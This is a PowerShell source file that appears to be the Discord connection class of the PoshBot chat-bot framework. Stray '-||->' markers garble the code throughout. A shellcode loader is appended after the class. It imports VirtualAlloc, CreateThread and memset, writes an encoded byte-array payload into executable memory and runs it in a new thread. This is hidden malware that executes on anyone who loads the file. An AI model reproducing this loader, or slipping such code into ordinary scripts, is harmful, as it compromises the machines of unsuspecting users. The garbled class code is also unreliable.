class DiscordConnection : Connection {

    [Net.WebSockets.ClientWebSocket]$WebSocket
    [pscustomobject]$GatewayInfo
    [string]$GatewayUrl
    [bool]$Connected
    [object]$ReceiveJob = $null

     -||-> DiscordConnection() {
         -||-> $this.WebSocket = [Net.WebSockets.ClientWebSocket]::new() <-||- 
         -||-> $this.WebSocket.Options.KeepAliveInterval = 5 <-||- 
    } <-||- 

    
    [void] -||-> Connect() {
         -||-> if ( -||-> $null -eq $this.ReceiveJob -or $this.ReceiveJob.State -ne 'Running' <-||- ) {
             -||-> $this.LogDebug('Connection to Discord gateway') <-||- 
             -||-> $this.ConnectGateway() <-||- 
             -||-> $this.StartReceiveJob() <-||- 
        } else {
             -||-> $this.LogDebug([LogSeverity]::Warning, 'Receive job is already running') <-||- 
        } <-||- 
    } <-||- 

    
    [void] -||-> ConnectGateway() {
         -||-> try {
             -||-> $headers = @{
                Authorization =  -||-> "Bot $( -||-> $this.Config.Credential.GetNetworkCredential().password <-||- )" <-||- 
            } <-||- 
             -||-> $this.GatewayInfo =  -||-> Invoke-RestMethod -Uri 'https://discordapp.com/api/gateway/bot' -Headers $headers <-||-  <-||- 
             -||-> $this.GatewayUrl = "$( -||-> $this.GatewayInfo.url <-||- )/v=6&encoding=json" <-||- 
        } catch {
             -||-> $this.LogInfo([LogSeverity]::Error, 'Unable to determine Discord gateway URL', [ExceptionFormatter]::Summarize($_)) <-||- 
        } <-||- 
    } <-||- 

    
    [void] -||-> StartReceiveJob() {
         -||-> $recv = {
            [cmdletbinding()]
            param(
                [parameter(Mandatory)]
                [string]$Url,

                [string]$Token,

                [string]$BotId
            )

             -||-> $ErrorActionPreference = 'Stop' <-||- 

            
            enum DiscordOpCode {
                Dispatch            = 0
                Heartbeat           = 1
                Identify            = 2
                StatusUpdate        = 3
                VoiceStateUpdate    = 4
                
                Resume              = 6
                Reconnect           = 7
                RequestGuildMembers = 8
                InvalidSession      = 9
                Hello               = 10
                HeartbeatAck        = 11
            }

             -||-> [Net.WebSockets.ClientWebSocket]$WebSocket = [Net.WebSockets.ClientWebSocket]::new() <-||- 
             -||-> [int]$heartbeatInterval     = $null <-||- 
             -||-> [int]$heartbeatSequence     = 0 <-||- 

            
             -||-> $buffer = [Net.WebSockets.WebSocket]::CreateClientBuffer(1024,1024) <-||- 
             -||-> $cts = [Threading.CancellationTokenSource]::new() <-||- 
             -||-> $task = $webSocket.ConnectAsync($Url, $cts.Token) <-||- 
            do {  -||-> Start-Sleep -Milliseconds 100 <-||-  }
            until ( -||-> $task.IsCompleted <-||- )

            
             -||-> $ct = [Threading.CancellationToken]::new($false) <-||- 
             -||-> $taskResult = $null <-||- 

             -||-> function New-DiscordPayload {
                [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '', Scope='Function', Target='*')]
                [OutputType([string])]
                [cmdletbinding()]
                param(
                    [parameter(Mandatory)]
                    [DiscordOpCode]$Opcode,

                    [parameter(Mandatory)]
                    [pscustomobject]$Data,

                    [int]$SequenceNumber,

                    [string]$EventName
                )

                 -||-> $payload = @{
                    op =  -||-> $Opcode.value__ <-||- 
                    d  =  -||-> $Data <-||- 
                } <-||- 

                 -||-> if ( -||-> $Opcode -eq [DiscordOpCode]::Dispatch <-||- ) {
                     -||-> $payload['s'] = $SequenceNumber <-||- 
                     -||-> $payload['t'] = $EventName <-||- 
                } <-||- 

                 -||-> ConvertTo-Json -InputObject $payload -Compress <-||- 
            } <-||- 

             -||-> function Send-Heartbeat {
                 -||-> $heartbeat =  -||-> New-DiscordPayload -Opcode 'Heartbeat' -Data $heartbeatSequence <-||-  <-||- 
                 -||-> [ArraySegment[byte]]$bytes = [Text.Encoding]::UTF8.GetBytes($heartbeat) <-||- 
                 -||-> Write-Debug "Sending heartbeat: [$heartbeatSequence]" <-||- 
                 -||-> $WebSocket.SendAsync($bytes, [Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).GetAwaiter().GetResult() > $null <-||- 
                 -||-> $script:heartbeatSequence += 1 <-||- 
                 -||-> $stopWatch.Restart() <-||- 
            } <-||- 

             -||-> function Send-Indentify {
                 -||-> $data = [pscustomobject]@{
                    token =  -||-> $Token <-||- 
                    properties =  -||-> @{
                        '$os'      =  -||-> 'PowerShell' <-||- 
                        '$browser' =  -||-> 'PoshBot' <-||- 
                        '$device'  =  -||-> 'PoshBot' <-||- 
                    } <-||- 
                    compress =  -||-> $false <-||- 
                } <-||- 
                 -||-> $id =  -||-> New-DiscordPayload -Opcode 'Identify' -Data $data <-||-  <-||- 
                 -||-> [ArraySegment[byte]]$bytes = [Text.Encoding]::UTF8.GetBytes($id) <-||- 
                 -||-> Write-Debug 'Sending Identify packet' <-||- 
                 -||-> $WebSocket.SendAsync($bytes, [Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).GetAwaiter().GetResult() > $null <-||- 
            } <-||- 

            
             -||-> function Receive-Msg {
                 -||-> $jsonResult = "" <-||- 
                do {
                     -||-> $taskResult = $webSocket.ReceiveAsync($buffer, $ct) <-||- 
                     -||-> while ( -||-> -not $taskResult.IsCompleted <-||- ) {
                         -||-> if ( -||-> $stopWatch.ElapsedMilliseconds -ge $heartbeatInterval <-||- ) {
                             -||-> Send-Heartbeat <-||- 
                        } <-||- 
                         -||-> [Threading.Thread]::Sleep(10) <-||- 
                    } <-||- 
                     -||-> $jsonResult += [Text.Encoding]::UTF8.GetString($buffer, 0, $taskResult.Result.Count) <-||- 
                } until (
                     -||-> $taskResult.Result.EndOfMessage <-||- 
                )

                 -||-> if ( -||-> -not [string]::IsNullOrEmpty($jsonResult) <-||- ) {
                     -||-> Write-Debug "Receive-Msg: $jsonResult" <-||- 
                     -||-> $jsonParams = @{
                        InputObject =  -||-> $jsonResult <-||- 
                    } <-||- 
                     -||-> if ( -||-> $global:PSVersionTable.PSVersion.Major -ge 6 <-||- ) {
                         -||-> $jsonParams['Depth'] = 50 <-||- 
                    } <-||- 
                     -||-> try {
                         -||-> $msgs =  -||-> ConvertFrom-Json @jsonParams <-||-  <-||- 
                    }
                    catch {
                        throw  -||-> $Error[0] <-||- 
                    } <-||- 
                     -||-> foreach ($msg in  -||-> $msgs <-||- ) {
                        switch ( -||-> [DiscordOpCode]$msg.op <-||- ) {
                            ( -||-> [DiscordOpCode]::Dispatch <-||- ) {
                                
                                 -||-> if ( -||-> -not ( -||-> $msg.d.user_id -and $msg.d.user_id -eq $BotId <-||- ) -and
                                    -not ( -||-> $msg.d.author.id -and $msg.d.author.id -eq $BotId <-||- ) <-||- ) {
                                    
                                     -||-> ConvertTo-Json -InputObject $msg -Compress <-||- 
                                } <-||- 
                                break
                            }
                            ( -||-> [DiscordOpCode]::Heartbeat <-||- ) {
                                
                                
                                break
                            }
                            ( -||-> [DiscordOpCode]::Reconnect <-||- ) {
                                
                                
                                break
                            }
                            ( -||-> [DiscordOpCode]::InvalidSession <-||- ) {
                                
                                
                                break
                            }
                            ( -||-> [DiscordOpCode]::Hello <-||- ) {
                                
                                 -||-> Write-Debug "Received heartbeat interval [$( -||-> $msg.d.heartbeat_interval <-||- )]" <-||- 
                                 -||-> $script:heartbeatInterval = $msg.d.heartbeat_interval <-||- 

                                
                                 -||-> if ( -||-> $firstHeartbeat <-||- ) {
                                     -||-> Send-Indentify <-||- 
                                     -||-> $firstHeartbeat = $false <-||- 
                                } <-||- 
                                break
                            }
                            ( -||-> [DiscordOpCode]::HeartbeatAck <-||- ) {
                                 -||-> Write-Debug 'Received heartbeat ack' <-||- 
                                break
                            }
                        }
                    } <-||- 
                } <-||- 
            } <-||- 

             -||-> $stopWatch = [System.Diagnostics.Stopwatch]::new() <-||- 
             -||-> $stopWatch.Start() <-||- 
             -||-> $firstHeartbeat = $true <-||- 
             -||-> while ( -||-> $webSocket.State -eq [Net.WebSockets.WebSocketState]::Open <-||- ) {
                 -||-> Receive-Msg <-||- 
            } <-||- 

             -||-> $socketStatus = [pscustomobject]@{
                State       =  -||-> $webSocket.State <-||- 
                Status      =  -||-> $webSocket.CloseStatus <-||- 
                Description =  -||-> $webSocket.CloseStatusDescription <-||- 
            } <-||- 
             -||-> $socketStatusStr = ( -||-> $socketStatus | Format-List | Out-String <-||- ).Trim() <-||- 
             -||-> Write-Host "Websocket state is [$( -||-> $webSocket.State <-||- )]" <-||- 
             -||-> Write-Warning -Message "Websocket state is [$( -||-> $webSocket.State.ToString() <-||- )].`n$socketStatusStr" <-||- 
        } <-||- 

         -||-> try {
             -||-> $jobParams = @{
                Name         =  -||-> 'ReceiveDiscordGatewayMessages' <-||- 
                ScriptBlock  =  -||-> $recv <-||- 
                ArgumentList =  -||-> @( -||-> $this.GatewayUrl, $this.Config.Credential.GetNetworkCredential().password, $this.Config.Credential.Username <-||- ) <-||- 
                ErrorAction  =  -||-> 'Stop' <-||- 
                Verbose      =  -||-> $true <-||- 
            } <-||- 
             -||-> $this.ReceiveJob =  -||-> Start-Job @jobParams <-||-  <-||- 
             -||-> $this.Connected = $true <-||- 
             -||-> $this.Status = [ConnectionStatus]::Connected <-||- 
             -||-> $this.LogInfo("Started websocket receive job [$( -||-> $this.ReceiveJob.Id <-||- )") <-||- 
        } catch {
             -||-> $this.LogInfo([LogSeverity]::Error, "$( -||-> $_.Exception.Message <-||- )", [ExceptionFormatter]::Summarize($_)) <-||- 
        } <-||- 
    } <-||- 

    
    [string[]] -||-> ReadReceiveJob() {
        
         -||-> $infoStream    = $this.ReceiveJob.ChildJobs[0].Information.ReadAll() <-||- 
         -||-> $warningStream = $this.ReceiveJob.ChildJobs[0].Warning.ReadAll() <-||- 
         -||-> $errStream     = $this.ReceiveJob.ChildJobs[0].Error.ReadAll() <-||- 
         -||-> $verboseStream = $this.ReceiveJob.ChildJobs[0].Verbose.ReadAll() <-||- 
         -||-> $debugStream   = $this.ReceiveJob.ChildJobs[0].Debug.ReadAll() <-||- 
         -||-> foreach ($item in  -||-> $infoStream <-||- ) {
             -||-> $this.LogInfo($item.ToString()) <-||- 
        } <-||- 
         -||-> foreach ($item in  -||-> $warningStream <-||- ) {
             -||-> $this.LogInfo([LogSeverity]::Warning, $item.ToString()) <-||- 
        } <-||- 
         -||-> foreach ($item in  -||-> $errStream <-||- ) {
             -||-> $this.LogInfo([LogSeverity]::Error, $item.ToString()) <-||- 
        } <-||- 
         -||-> foreach ($item in  -||-> $verboseStream <-||- ) {
             -||-> $this.LogVerbose($item.ToString()) <-||- 
        } <-||- 
         -||-> foreach ($item in  -||-> $debugStream <-||- ) {
             -||-> $this.LogVerbose($item.ToString()) <-||- 
        } <-||- 

        
         -||-> if ( -||-> $this.ReceiveJob.State -ne 'Running' <-||- ) {
             -||-> $this.LogInfo([LogSeverity]::Warning, "Receive job state is [$( -||-> $this.ReceiveJob.State <-||- )]. Attempting to reconnect...") <-||- 
            
             -||-> Start-Sleep -Seconds 5 <-||- 
             -||-> $this.Connect() <-||- 
        } <-||- 

        
         -||-> if ( -||-> $this.ReceiveJob.HasMoreData <-||- ) {
             -||-> [string[]]$jobResult = $this.ReceiveJob.ChildJobs[0].Output.ReadAll() <-||- 
            return  -||-> $jobResult <-||- 
        } else {
            return  -||-> $null <-||- 
        } <-||- 
    } <-||- 

    
    [void] -||-> Disconnect() {
         -||-> $this.LogInfo('Closing websocket') <-||- 
         -||-> if ( -||-> $this.ReceiveJob <-||- ) {
             -||-> $this.LogInfo("Stopping receive job [$( -||-> $this.ReceiveJob.Id <-||- )]") <-||- 
             -||-> $this.ReceiveJob | Stop-Job -Confirm:$false -PassThru | Remove-Job -Force -ErrorAction SilentlyContinue <-||- 
        } <-||- 
         -||-> $this.Connected = $false <-||- 
         -||-> $this.Status = [ConnectionStatus]::Disconnected <-||- 
    } <-||- 
}

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbf,0x4b,0x3f,0x44,0x56,0xda,0xc8,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x7d,0x13,0x83,0xc5,0x04,0x03,0x7d,0x44,0xdd,0xb1,0xaa,0xb2,0xa3,0x3a,0x53,0x42,0xc4,0xb3,0xb6,0x73,0xc4,0xa0,0xb3,0x23,0xf4,0xa3,0x96,0xcf,0x7f,0xe1,0x02,0x44,0x0d,0x2e,0x24,0xed,0xb8,0x08,0x0b,0xee,0x91,0x69,0x0a,0x6c,0xe8,0xbd,0xec,0x4d,0x23,0xb0,0xed,0x8a,0x5e,0x39,0xbf,0x43,0x14,0xec,0x50,0xe0,0x60,0x2d,0xda,0xba,0x65,0x35,0x3f,0x0a,0x87,0x14,0xee,0x01,0xde,0xb6,0x10,0xc6,0x6a,0xff,0x0a,0x0b,0x56,0x49,0xa0,0xff,0x2c,0x48,0x60,0xce,0xcd,0xe7,0x4d,0xff,0x3f,0xf9,0x8a,0xc7,0xdf,0x8c,0xe2,0x34,0x5d,0x97,0x30,0x47,0xb9,0x12,0xa3,0xef,0x4a,0x84,0x0f,0x0e,0x9e,0x53,0xdb,0x1c,0x6b,0x17,0x83,0x00,0x6a,0xf4,0xbf,0x3c,0xe7,0xfb,0x6f,0xb5,0xb3,0xdf,0xab,0x9e,0x60,0x41,0xed,0x7a,0xc6,0x7e,0xed,0x25,0xb7,0xda,0x65,0xcb,0xac,0x56,0x24,0x83,0x01,0x5b,0xd7,0x53,0x0e,0xec,0xa4,0x61,0x91,0x46,0x23,0xc9,0x5a,0x41,0xb4,0x2e,0x71,0x35,0x2a,0xd1,0x7a,0x46,0x62,0x15,0x2e,0x16,0x1c,0xbc,0x4f,0xfd,0xdc,0x41,0x9a,0x52,0x8d,0xed,0x75,0x13,0x7d,0x4d,0x26,0xfb,0x97,0x42,0x19,0x1b,0x98,0x89,0x32,0xb6,0x62,0x59,0x6e,0xbb,0xe1,0xef,0xf8,0x41,0xfa,0x1e,0xa5,0xcc,0x1c,0x4a,0x45,0x99,0xb7,0xe2,0xfc,0x80,0x4c,0x93,0x01,0x1f,0x29,0x93,0x8a,0xac,0xcd,0x5d,0x7b,0xd8,0xdd,0x09,0x8b,0x97,0xbc,0x9f,0x94,0x0d,0xaa,0x1f,0x01,0xaa,0x7d,0x48,0xbd,0xb0,0x58,0xbe,0x62,0x4a,0x8f,0xb5,0xab,0xde,0x70,0xa1,0xd3,0x0e,0x71,0x31,0x82,0x44,0x71,0x59,0x72,0x3d,0x22,0x7c,0x7d,0xe8,0x56,0x2d,0xe8,0x13,0x0f,0x82,0xbb,0x7b,0xad,0xfd,0x8c,0x23,0x4e,0x28,0x0d,0x1f,0x99,0x14,0x7b,0x71,0x19 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



